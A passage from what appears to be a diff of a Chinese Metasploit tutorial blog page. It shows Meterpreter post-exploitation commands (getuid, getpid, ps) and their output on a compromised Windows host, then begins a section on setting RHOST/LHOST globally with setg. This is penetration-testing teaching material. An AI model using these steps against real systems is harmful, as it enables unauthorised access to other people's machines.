class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: DH-CA8822AB9589\Administrator</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 1640</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">PID PPID Name Arch Session User Path</span><br><span class="line">--- ---- ---- ---- ------- ---- ----</span><br><span class="line">0 0 [System Process]</span><br><span class="line">…………</span><br><span class="line">1408 676 spoolsv.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\spoolsv.exe</span><br><span class="line">1640 1620 explorer.exe x86 0 DH-CA8822AB9589\Administrator C:\WINDOWS\Explorer.EXE</span><br><span class="line">1748 1640 VMwareTray.exe x86 0 DH-CA8822AB9589\Administrator C:\Program Files\VMware\VMware Tools\VMwareTray.exe</span><br><span class="line">…………</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 <h3 id="metasploit-中的全局变量">6、Metasploit 中的全局变量</h3>
 <p>使用setg命令可以实现RHOST或者LHOST选项的全局化，让它们可以被所有模块使用</p>
 <p>示例</p>
@@ -621,7 +445,7 @@ meterpreter &gt;</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:14</span>
+    <span title="站点阅读时长">10:15</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
